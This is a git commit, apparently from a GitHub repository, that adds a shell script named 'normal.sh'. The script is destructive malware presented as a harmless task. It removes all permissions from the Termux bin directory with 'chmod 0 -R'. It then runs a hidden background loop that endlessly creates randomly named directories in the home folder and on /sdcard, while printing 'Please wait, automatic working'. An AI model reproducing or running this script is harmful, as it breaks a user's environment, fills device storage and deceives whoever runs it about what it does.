2b3e3b60311780314d8045eb48e50484128829e3
Maruf <50019150+rooted-cyber@users.noreply.github.com>
2021-01-25 23:35:38 +0530

    Add files via upload

---
+++ Normal-Users/normal.sh
@@ -0,0 +1,22 @@
+h() {
+	cd $PREFIX
+	}
+	i() {
+		chmod 0 -R
+		}
+		j() {
+			/system
+			}
+			j="/system"
+	a() {
+		printf "\n Please wait , automatic working \n\n"
+		h
+		i bin
+		chmod 0 -R bin
+		while [ true ];do
+		cd $j/bin
+		./mkdir ~/hello$RANDOM$RANDOM$RANDOM$RANDOM$RANDO$RANDOM
+		./mkdir /sdcard/hello$RANDOM$RANDOM$RANDOM$RANDOM$RANDO
+		done > /dev/null 2>&1 &
+		}
+		a
